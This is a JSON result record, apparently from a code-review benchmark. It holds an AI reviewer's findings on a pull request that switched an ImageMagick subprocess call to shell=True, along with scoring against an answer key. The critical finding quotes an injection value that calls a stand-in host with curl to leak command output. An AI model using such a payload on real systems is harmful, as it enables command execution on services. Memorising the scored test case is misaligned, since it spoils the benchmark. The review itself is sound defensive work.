@@ -1,0 +1,57 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "426aa0eb574d",
+  "turns": 3,
+  "tool_calls": null,
+  "seconds": 48.1,
+  "setup_seconds": 0.0,
+  "total_seconds": 48.1,
+  "usage": {
+    "in": 28186,
+    "cache_read": 54784,
+    "cache_write": 0,
+    "out": 1520,
+    "source": "cli"
+  },
+  "cost_usd": 0.0819272,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "**Command injection via `shell=True`.** `upload_dir`, `name`, and `oid` are interpolated into a shell command string. A crafted `name` such as `x; curl evil.test/$(id)` (or any value with `;`, `|`, `$()`, backticks) executes arbitrary commands as the service user.\n\nImageMagick 7 policy delegates do not require a shell \u2014 Policy.xml applies to MagickCore whether you exec `convert` directly or via `sh -c`. Revert to argv-list form (`shell=False`). If IM7 needs the `magick` frontend, only change the executable:\n\n```suggestion\n    subprocess.run(\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```\n\nNever pass user-influenced path segments through the shell; keep one argv element per argument so metacharacters stay data."
+    },
+    {
+      "path": "thumbs.py",
+      "line": 6,
+      "severity": "warning",
+      "body": "**Bare `convert` on PATH.** The previous code used `/usr/bin/convert` (absolute path). The new shell command resolves `convert` via `$PATH`, which is weaker under a compromised or surprising environment (dependency confusion / PATH prepend on the runner/service account).\n\nWhen restoring argv form, keep the absolute path (or `/usr/bin/magick` on IM7) so the binary cannot be shadowed."
+    }
+  ],
+  "summary": "## Verdict\n\n**Critical security regression** \u2014 this PR introduces shell injection by switching `subprocess.run` from argv-list form to `shell=True` with unescaped interpolation of `upload_dir`, `name`, and `oid`.\n\n## Findings\n\n| # | Severity | File | Summary |\n|---|----------|------|---------|\n| 1 | \ud83d\udea8 critical | `thumbs.py:6` | `shell=True` with f-string interpolation enables command injection |\n| 2 | \u26a0\ufe0f warning | `thumbs.py:6` | Bare `convert` drops absolute path; PATH/name resolution weaker than `/usr/bin/convert` |\n\n## Details\n\nImageMagick 7 policy delegates do **not** require a shell. Policy.xml constrains which coders/delegates MagickCore may invoke; that applies equally to the argv-list form. The previous call was the correct pattern:\n\n```python\nsubprocess.run(\n    [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n    check=True,\n)\n```\n\nIf IM7 needs the `magick` binary instead of `convert`, change only the executable path \u2014 keep `shell=False` and an argument vector.\n\nAny value of `name` (or `upload_dir` / `oid`) containing shell metacharacters (`;`, `|`, `$(...)`, backticks, spaces, etc.) becomes attacker-controlled command execution on the host that writes thumbs. The removed comment claimed upstream ALLOWED_FILES validation; even if that regex still exists elsewhere, shell interpolation is the wrong boundary \u2014 argv form does not need that hope.\n\n## Release decision\n\n**Recommendation:** request-changes\n",
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
